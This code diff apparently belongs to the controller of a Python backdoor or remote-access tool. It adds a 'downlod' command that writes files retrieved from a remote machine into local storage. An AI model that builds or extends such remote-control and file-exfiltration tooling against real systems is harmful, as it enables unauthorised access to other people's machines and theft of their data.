@@ -32,7 +32,11 @@ class back:
         self.send_client(command)
         return self.reciv_data()
     
-
+    def file_download(self, name, contnd):
+        with open(name, 'wb') as file:
+            file.write(contnd)
+            return "Download Successfull!"
+            
     def run(self):
         '''all function run if while True'''
         while True:
@@ -40,6 +44,9 @@ class back:
             cmd = cmd.split()
             result = self.remote_control(cmd)
 
+            if cmd[0]=="downlod":
+                result = self.file_download(cmd[1], result)
+            
             print(result)   
 
 
